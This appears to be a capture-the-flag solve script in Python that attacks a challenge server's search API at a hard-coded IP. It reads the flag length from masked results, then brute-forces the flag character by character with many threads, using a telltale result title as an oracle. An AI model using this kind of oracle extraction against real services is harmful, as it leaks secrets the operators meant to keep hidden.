import requests
import string
import threading 

url = "http://34.134.162.213:17000/"

working = None 
stop_event = threading.Event()
response_lock = threading.Lock() 
flag = "L3A" 
i = 1 

def search(s, thread_name, stop_event, response_lock):
    global working 
    global flag
    global i 

    try: 
        if stop_event.is_set():
            return 
    
        search = url+"/api/search"
        json = { "query": s}
        resp = requests.post(search, json=json)
    
        with response_lock:
            if stop_event.is_set():
                return 
            if resp.json()["results"][0]["title"] == "Not the flag?":
                print(f"match found- {thread_name},{i}")
                flag += s[-1]
                i += 1
                stop_event.set()
    except Exception:
        pass 


# get flag length
resp = requests.post(url+"/api/search", json={"query": ["L3A"]})
print(resp.text)
flag_length = resp.json()["results"][0]["content"].count("*") - 3 # because we know first 4

# multithread it 
for _ in range(flag_length):
    threads = [] 
    stop_event = threading.Event()
    response_lock = threading.Lock() 
    for c in string.printable:
        s = flag[i:]+c
        thread_name = f"fetcher-{s}"
        thread = threading.Thread(target=search, args=(s, thread_name, stop_event, response_lock))

        threads.append(thread)
        thread.start() 
        
    for thread in threads:
        thread.join(timeout=10)
print(flag)
        
        
